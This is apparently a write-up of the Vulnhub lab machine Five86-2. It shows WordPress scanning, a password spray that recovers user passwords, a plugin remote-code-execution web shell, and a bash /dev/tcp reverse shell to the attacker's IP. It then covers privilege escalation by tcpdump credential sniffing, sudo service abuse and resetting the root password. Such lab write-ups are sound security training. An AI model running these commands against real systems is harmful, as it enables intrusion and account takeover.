# Five86-2
![](https://i.imgur.com/2fFJqi2.png)
## Scanning
### nmap
```
$ nmap -p- -A -T5 192.168.75.129 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-24 23:02 EDT
Nmap scan report for 192.168.75.129
Host is up (0.0011s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.1.4
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Five86-2 &#8211; Just another WordPress site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.79 seconds
```
### dirsearch
```
$ dirsearch -u http://five86-2
[23:37:03] 301 -    0B  - /index.php  ->  http://five86-2/
[23:37:04] 200 -   19KB - /license.txt
[23:37:06] 200 -    7KB - /readme.html
[23:37:06] 403 -  273B  - /server-status             
[23:37:06] 403 -  273B  - /server-status/            
[23:37:08] 500 -    3KB - /wp-admin/setup-config.php
[23:37:08] 200 -    0B  - /wp-content/
[23:37:08] 301 -  309B  - /wp-content  ->  http://five86-2/wp-content/
[23:37:08] 301 -  307B  - /wp-admin  ->  http://five86-2/wp-admin/
[23:37:08] 200 -   69B  - /wp-content/plugins/akismet/akismet.php                                           
[23:37:08] 500 -    0B  - /wp-content/plugins/hello.php                                                     
[23:37:08] 200 -    1KB - /wp-content/uploads/
[23:37:08] 200 -    0B  - /wp-config.php
[23:37:08] 301 -  310B  - /wp-includes  ->  http://five86-2/wp-includes/
[23:37:08] 200 -  772B  - /wp-content/upgrade/
[23:37:08] 500 -    0B  - /wp-includes/rss-functions.php                                                    
[23:37:08] 200 -    1KB - /wp-admin/install.php     
[23:37:08] 200 -   42KB - /wp-includes/
[23:37:08] 302 -    0B  - /wp-admin/  ->  http://five86-2/wp-login.php?redirect_to=http%3A%2F%2Ffive86-2%2Fwp-admin%2F&reauth=1
[23:37:08] 400 -    1B  - /wp-admin/admin-ajax.php
[23:37:08] 200 -    3KB - /wp-login.php
[23:37:08] 302 -    0B  - /wp-signup.php  ->  http://five86-2/wp-login.php?action=register
[23:37:08] 200 -    0B  - /wp-cron.php
[23:37:08] 405 -   42B  - /xmlrpc.php          
                                                     
Task Completed                      
```
### wpscan
```
$ wpscan -e u,ap --url http://five86-2

...

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://five86-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] barney
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] gillian
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] stephen
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

## Gain Access
### Crack Password
```
$ wpscan --url http://five86-2 -U u.txt -P /usr/share/wordlists/rockyou.txt

...

[+] Performing password attack on Xmlrpc against 5 user/s
[SUCCESS] - barney / spooky1                            
[SUCCESS] - stephen / apollo1
```

### Exploit
* [WordPress Plugin Insert or Embed Articulate Content into WordPress - Remote Code Execution](https://www.exploit-db.com/exploits/46981)
```
http://five86-2/wp-content/uploads/articulate_uploads/poc/index.php?cmd=whoami
```
![](https://i.imgur.com/8s7tS2H.png)

### Reverse Shell
* example
```
http://<url>/index.php?cmd=/bin/bash -c 'exec bash -i &>/dev/tcp/<host>/<port> <&1'
```
* url encoding
```
http://five86-2/wp-content/uploads/articulate_uploads/poc/index.php?cmd=%2Fbin%2Fbash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.75.128%2F8787%20%3C%261%27
```
* nc listening
```
$ nc -lvp 8787                   
listening on [any] 8787 ...
connect to [192.168.75.128] from five86-2 [192.168.75.129] 52496
bash: cannot set terminal process group (1070): Inappropriate ioctl for device
bash: no job control in this shell
www-data@five86-2:/var/www/html/wp-content/uploads/articulate_uploads/poc$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@five86-2:/var/www/html/wp-content/uploads/articulate_uploads/poc$ 
```

## Privilege Escalation
### su stephen
```
$ su stephen
Password: apollo1
$ id
uid=1002(stephen) gid=1002(stephen) groups=1002(stephen),1009(pcap)
```

### tcpdump
```
$ cd /var/tmp
```
```
$ tcpdump -D
1.br-eca3858d86bf [Up, Running]
2.eth0 [Up, Running]
3.vethe439d70 [Up, Running]
4.lo [Up, Running, Loopback]
5.any (Pseudo-device that captures on all interfaces) [Up, Running]
6.docker0 [Up]
7.nflog (Linux netfilter log (NFLOG) interface) [none]
8.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none]
```
```
$ timeout 600 tcpdump -w cap.pcap -i vethe439d70
```
```
$ tcpdump -r cap.pcap
```
```
paul:esomepasswford
```

### su paul
```
$ su paul
Password: esomepasswford
$ id
uid=1006(paul) gid=1006(paul) groups=1006(paul),1010(ncgroup)
```

### sudo -l (paul)
```
$ sudo -l
Matching Defaults entries for paul on five86-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User paul may run the following commands on five86-2:
    (peter) NOPASSWD: /usr/sbin/service
```

### service
```
$ sudo -u peter service ../../bin/sh
```

### sudo -l (peter)
```
$ sudo -l
Matching Defaults entries for peter on five86-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User peter may run the following commands on five86-2:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/passwd

```

### passwd
```
$ sudo passwd root
New password: toor
Retype new password: toor
passwd: password updated successfully
```

### su root
```
$ su root
Password: toor
# id
uid=0(root) gid=0(root) groups=0(root)
```


## Reference
* [vulnhub - Five86-2](https://www.vulnhub.com/entry/five86-2,418/)
* [Hacking Articles - Five86-2: Vulnhub Walkthrough](https://www.hackingarticles.in/five86-2-vulnhub-walkthrough/)
* [blog.mzfr.me - Vulnhub - Five86 writeup](https://blog.mzfr.me/vulnhub-writeups/2020-01-09-five862)
